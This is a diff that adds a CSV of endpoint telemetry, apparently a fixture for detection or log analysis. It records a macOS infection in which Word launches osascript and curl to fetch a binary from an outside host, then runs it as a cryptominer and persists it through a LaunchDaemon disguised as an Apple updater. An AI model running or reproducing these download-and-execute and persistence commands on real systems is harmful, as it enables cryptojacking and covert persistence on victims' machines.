@@ -1,0 +1,13 @@
+timestamp,host,event_type,process,parent,cmdline,remote_ip,remote_port,sha256
+2026-09-16T09:41:02Z,mac-victim-07,PROCESS,Microsoft Word,launchd,/Applications/Microsoft Word.app,,, 
+2026-09-16T09:41:03Z,mac-victim-07,PROCESS,osascript,Microsoft Word,osascript -e do shell script curl -s http://198.51.100.44/assets/update.bin -o /tmp/.u,198.51.100.44,80,
+2026-09-16T09:41:03Z,mac-victim-07,NETWORK,osascript,Microsoft Word,,198.51.100.44,80,
+2026-09-16T09:41:05Z,mac-victim-07,FILE_WRITE,curl,osascript,curl -s http://198.51.100.44/assets/update.bin -o /tmp/.u,198.51.100.44,80,e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+2026-09-16T09:41:07Z,mac-victim-07,PROCESS,sh,osascript,sh -c chmod +x /tmp/.u; /tmp/.u --pool 203.0.113.9:8443,,, 
+2026-09-16T09:41:08Z,mac-victim-07,PROCESS,.u,sh,/tmp/.u --pool 203.0.113.9:8443 --donate 0,203.0.113.9,8443,a94a8fe5ccb19ba61c4c0873d391e987982fbbd3b8c1795d9e1f6b5f7c9a1234
+2026-09-16T09:41:08Z,mac-victim-07,NETWORK,.u,sh,,203.0.113.9,8443,
+2026-09-16T09:41:12Z,mac-victim-07,FILE_WRITE,.u,sh,write /Library/LaunchDaemons/com.apple.softwareupdated.helper.plist,,, 
+2026-09-16T09:41:13Z,mac-victim-07,PROCESS,launchctl,.u,launchctl load /Library/LaunchDaemons/com.apple.softwareupdated.helper.plist,,, 
+2026-09-16T09:42:30Z,mac-victim-07,NETWORK,.u,launchd,,203.0.113.9,8443,
+2026-09-16T09:47:30Z,mac-victim-07,NETWORK,.u,launchd,,203.0.113.9,8443,
+2026-09-16T09:52:31Z,mac-victim-07,CPU,.u,launchd,sustained_cpu_98pct,203.0.113.9,8443,
